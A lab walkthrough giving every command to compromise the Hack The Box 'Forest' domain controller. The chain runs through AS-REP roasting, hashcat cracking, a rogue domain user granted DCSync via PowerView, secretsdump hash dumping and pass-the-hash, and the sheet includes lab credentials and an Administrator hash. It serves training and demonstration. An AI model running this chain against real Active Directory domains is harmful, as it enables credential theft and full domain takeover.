# Forest — Live Demo Command Sheet (with explanations)

**Goal:** fully own the Forest Domain Controller — user flag → root flag.
Every command has a short note on **what it does** and **why**.

---

## ⚠️ Read first: which window?

You work in **two terminals**. Always check the prompt before typing:

| Prompt you see | Window | Run here |
|---|---|---|
| `esrr@htb-...$` | **Pwnbox** (Linux / attacker) | `nmap`, `rpcclient`, `impacket-*`, `hashcat`, `evil-winrm`, `bloodhound-python` |
| `*Evil-WinRM* PS C:\>` | **Target** (Windows) | `net`, `upload`, `Import-Module`, PowerView, `type` |

> **Two rules that save the demo:**
> 1. Keep **two Pwnbox windows** open — one for attacker tools, one stays inside Evil‑WinRM.
> 2. Inside Evil‑WinRM, run commands **one line at a time**. `upload` especially must be typed alone.

---

## 0) Setup  (Pwnbox)

```bash
export IP=10.129.95.210
```
Stores the target's IP in a variable so every later command can use `$IP`. If the box resets you only change it here.

```bash
echo $IP
```
Prints the variable back — a quick check that it's set correctly.

```bash
ping -c 3 $IP
```
Sends 3 test packets to confirm the machine is online and reachable (`-c 3` = stop after 3).

```bash
sudo sh -c "echo '$IP FOREST.htb.local htb.local FOREST' >> /etc/hosts"
```
Maps the domain name to the IP in the hosts file, so Kerberos/LDAP tools that need the name (not just the IP) work.

---

## 1) Recon — port scan  (Pwnbox)

```bash
nmap -sC -sV $IP -oN nmap_forest.txt
```
Scans open ports and identifies services. `-sV` = detect service versions, `-sC` = run safe default scripts, `-oN` = save the output to a file.
**Read the result:** 53/88/389/445 together = a **Domain Controller**; 5985 = **WinRM**; domain = `htb.local`.

---

## 2) Enumeration — list domain users  (Pwnbox)

```bash
rpcclient -U "" -N $IP -c "enumdomusers"
```
Connects to the DC's RPC service with **no username and no password** (`-U "" -N` = anonymous/null session) and runs `enumdomusers` to list every domain user.
**Pick the target:** `svc-alfresco` (a service account — often weak/misconfigured).

---

## 3) AS‑REP Roasting — get a crackable ticket  (Pwnbox)

```bash
cat > users.txt << 'EOF'
sebastien
lucinda
svc-alfresco
andy
mark
santi
Administrator
EOF
```
Writes the interesting usernames into a file `users.txt` (one per line) to feed the next tool.

```bash
impacket-GetNPUsers htb.local/ -dc-ip $IP -usersfile users.txt -no-pass -outputfile hash.txt
```
Asks the DC for a Kerberos AS‑REP ticket for each user **without a password** (`-no-pass`). Accounts with pre‑auth **disabled** return an encrypted ticket. `-outputfile` saves any ticket to `hash.txt`.

```bash
cat hash.txt
```
Shows the saved ticket — you should see a `$krb5asrep$...svc-alfresco...` line (the only vulnerable user).

---

## 4) Crack the hash  (Pwnbox)

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
```
Decompresses the rockyou wordlist (needed once). `2>/dev/null` hides the error if it's already decompressed.

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
Cracks the ticket **offline** by trying every word in the list. `-m 18200` = the hash type for Kerberos AS‑REP. Offline = no alerts, no account lockout.
**Result → `svc-alfresco : s3rvice`**

---

## 5) Foothold + USER FLAG  (Pwnbox → opens Evil‑WinRM)

```bash
evil-winrm -i $IP -u svc-alfresco -p 's3rvice'
```
Opens a remote PowerShell session over WinRM (port 5985) using the cracked credentials. This is our first real access to the machine.

Now inside **Evil‑WinRM**:
```powershell
cd ..\Desktop
```
Moves from `\Documents` up and into the user's `\Desktop` folder, where the flag lives.
```powershell
dir
```
Lists the files in the folder (you'll see `user.txt`).
```powershell
type user.txt
```
Prints the file's content — **this is the USER FLAG**. Submit it on the HTB page.

---

## 6) BloodHound — map the path  (optional, for the visual)

Collect data (**Pwnbox**, 2nd window — keep Evil‑WinRM open):
```bash
mkdir -p ~/bloodhound && cd ~/bloodhound
```
Makes a folder for the output and moves into it so the collected files stay tidy.
```bash
bloodhound-python -u svc-alfresco -p 's3rvice' -d htb.local -ns $IP -c All --zip
```
Remotely collects all AD objects and their relationships. `-ns $IP` = use the DC as the DNS server (needed to resolve domain records), `-c All` = collect everything, `--zip` = package it for import.

View it (**Pwnbox desktop**, needs GUI):
```bash
sudo neo4j start
```
Starts the graph database that BloodHound stores its data in.
```bash
bloodhound
```
Opens the BloodHound GUI. Log in (`neo4j`/`neo4j`), click **Upload Data**, and select the `.zip`.

**Path revealed:**
`svc-alfresco → Account Operators → (GenericAll) Exchange Windows Permissions → (WriteDacl) htb.local → DCSync`

---

## 7) Privilege escalation — WriteDACL → DCSync  (the tested path)

**Step A — create the user + add it to the group (Evil‑WinRM, one line at a time):**
```powershell
net user hacker Password123! /add /domain
```
Creates a new domain user `hacker`. We can do this because `svc-alfresco` inherits **Account Operators** rights.
```powershell
net group "Exchange Windows Permissions" hacker /add
```
Adds `hacker` to the group that holds **WriteDACL** over the domain — so `hacker` inherits that power.

**Step B — put PowerView where `upload` will find it (Pwnbox):**
```bash
cp /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/
```
Copies PowerView into your home folder (Evil‑WinRM's `upload` looks for files relative to where it was launched).
```bash
cd ~
```
Moves to home so the next launch uses it as the base folder.
```bash
ls -la PowerView.ps1
```
Confirms PowerView is actually there before launching.
```bash
evil-winrm -i $IP -u svc-alfresco -p 's3rvice'
```
Re-opens the session **from the home folder** so `upload` can find the file.

**Step C — inside Evil‑WinRM, ONE LINE AT A TIME:**
```powershell
upload PowerView.ps1
```
Uploads PowerView to the target. **Type it alone** and wait for `Upload successful!` (it's an Evil‑WinRM command, not PowerShell).
```powershell
Import-Module .\PowerView.ps1
```
Loads PowerView's functions into the current session so we can use them.
```powershell
Get-Command Add-DomainObjectAcl
```
Sanity check — if it prints the function name, PowerView loaded correctly.
```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\hacker', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hacker -Rights DCSync
```
First two lines build a credential object for `hacker`. The third uses `hacker`'s **WriteDACL** to grant **DCSync** rights to `hacker` on the domain. **Silence = success**; wait ~1 minute.

> *Note: `impacket-dacledit` could do this in one Pwnbox line, but it is **not installed** on this Pwnbox — use the PowerView steps above.*

---

## 8) DCSync — dump the hashes  (Pwnbox)

```bash
impacket-secretsdump htb.local/hacker:'Password123!'@$IP
```
Logs in as `hacker` and uses its new DCSync rights to **replicate** (pull) every account's password hash from the DC — just like a domain controller would.
Copy the **Administrator NTLM hash** (the 4th field):
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```
> On Forest this admin hash is stable across resets: `32693b11e6aa90eb43d32c72a07ceea6`

---

## 9) Pass‑the‑Hash → ROOT FLAG  (Pwnbox)

If you're still inside Evil‑WinRM, type `exit` first, then:
```bash
evil-winrm -i $IP -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
```
Logs in **as Administrator using only the hash** (`-H`) — no password needed. This is Pass‑the‑Hash. You are now Domain Admin. 👑
```powershell
type C:\Users\Administrator\Desktop\root.txt
```
Prints the **ROOT FLAG**. Submit it on the HTB page — box fully owned. 🏁

---

## 10) Cleanup  (Evil‑WinRM, as Administrator)

```powershell
net user hacker /del /domain
```
Deletes the attacker account you created, to leave the environment clean.
```powershell
del C:\Users\Administrator\Documents\PowerView.ps1
```
Removes the tool you uploaded.

---

## Quick gotcha list

- **"command not found"** for `impacket-*` / `evil-winrm` → you're inside Evil‑WinRM; run it in **Pwnbox**.
- **`upload` not recognized** → type it **on its own line**, never inside a pasted block.
- **`upload` can't find the file** → `cp` PowerView to `~/`, `cd ~`, then launch `evil-winrm` (upload is relative to the launch folder).
- **`Add-DomainObjectAcl not recognized`** → PowerView didn't import; redo `upload` + `Import-Module` one line at a time.
- **rockyou not found** → `sudo gunzip /usr/share/wordlists/rockyou.txt.gz`.
- **secretsdump `rpc_s_access_denied` / `ERROR_DS_DRA_BAD_DN`** → DCSync not applied yet; wait a minute and retry (or the grant step didn't run).
- **`impacket-dacledit: command not found`** → not installed here; use the PowerView method in step 7.
- **IP changed** → the box gets a new IP on every reset; redo `export IP=...` and the `/etc/hosts` line.

---

### One‑glance chain
`nmap → rpcclient → AS‑REP Roast → hashcat (s3rvice) → evil-winrm (USER) → BloodHound → create user + WriteDACL → DCSync → secretsdump → Pass-the-Hash (ROOT)`
